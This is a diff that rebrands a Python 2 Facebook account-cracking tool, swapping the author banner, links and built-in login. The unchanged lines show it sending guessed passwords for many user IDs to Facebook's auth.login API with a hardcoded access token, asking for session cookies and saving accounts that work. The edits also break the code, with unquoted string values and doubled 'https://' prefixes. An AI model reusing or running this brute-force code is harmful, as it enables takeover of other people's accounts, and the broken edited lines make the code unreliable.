@@ -37,18 +37,17 @@ def jalan(z):
 		time.sleep(00000.1)
 ##### LOGO #####
 logo = """
-   Asif Javed
-   ▄︻̷̿┻̿═━一
-   THE ANONYMOUS lovehacker TRICKER 
-   THE LEGEND ℒℴνℯ
-   THE GAME CHANGER ℒℴνℯ
-   pakistani hackers
+    Jokar-sojib
+ ▄︻̷̿┻̿═━一
+   THE:jokar-hacker-Bd
+   THE Mymensingh
+   THE:sojib-01609859866
    ℒℴνℯ ▄︻̷̿┻̿═━一
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
-\033[1;96mYouTube \033[1;93m: \033[1;92mPakistani Hackers
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love
-\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker
+\033[1;96mAuthor  \033[1;93m: \033[1;92mjokar
+\033[1;96mYouTube \033[1;93m: \033[1;92mBangladesh
+\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/jokar-sojib02
+\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://https://www.facebook.com/=100070651505327
 \033[1;91m======================================="""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -66,14 +65,12 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ========================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
-\033[1;96mYouTube \033[1;93m: \033[1;92mlovehacker
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love
-\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker
+\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/jokar-sojib02
+\033[1;96mpage \033[1;93m: \033[1;92mhttps://https://www.facebook.com/=100070651505327
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
-CorrectUsername = "lovehacker"
-CorrectPassword = "03094161457"
+CorrectUsername =jokasojib02
+CorrectPassword =jokarsojib02
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
@@ -84,10 +81,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+            os.system('xdg-open https://https://www.facebook.com/profile.php?id=100070651505327')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+        os.system('xdg-open https://https://www.facebook.com/profile.php?id=100070651505327')
 def login():
 	os.system('clear')
 	try:
@@ -320,7 +317,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'Pakistan'
+									pass4 = Bangladesh
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
